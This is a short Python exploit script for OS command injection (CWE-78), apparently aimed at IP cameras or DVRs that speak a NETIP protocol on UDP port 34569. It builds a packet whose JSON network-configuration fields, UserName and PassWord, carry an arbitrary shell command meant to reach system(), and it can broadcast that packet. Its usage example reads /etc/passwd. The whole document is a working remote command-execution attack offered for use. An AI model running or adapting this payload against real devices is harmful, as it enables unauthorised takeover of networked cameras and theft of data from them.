#!/usr/bin/env python3
import socket
import json
import sys
import struct

def create_malicious_payload(command):
    # Create NETIP header (20 bytes)
    header = b"\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfa\x05\x00\x00\x00\x00"
    
    # Create JSON payload with command injection
    payload = {
        "NetWork.NetCommon": {
            "HostName": "Camera",
            "MAC": "00:11:22:33:44:55",
            "HostIP": "0x0100007f",  # 127.0.0.1
            "TCPPort": 34569,
            "ChannelNum": 1,
            "SN": "SN123456",
            "Version": "1.0.0",
            "BuildDate": "2024-03-20 12:00:00",
            # Example 1: Direct command injection for system()
            "UserName": f"/bin/sh -c '{command}'",  # Will be passed directly to system()
            # Example 2: Command injection that will go through 3 transformations
            "PassWord": command  # Will go through JSON parsing, validation and execution
        }
    }
    
    # Convert to JSON and add null terminator
    json_str = json.dumps(payload) + "\0"
    
    # Combine header and payload
    return header + json_str.encode()

def exploit(target_ip, target_port, command):
    # Create UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Enable broadcast
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    
    try:
        # Send payload to broadcast address
        payload = create_malicious_payload(command)
        s.sendto(payload, (target_ip, target_port))
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 exploit_cwe78.py <IP> <PORT> <COMMAND>")
        print("Example: python3 exploit_cwe78.py 127.0.0.1 34569 'cat /etc/passwd'")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    command = sys.argv[3]
    
    exploit(target_ip, target_port, command)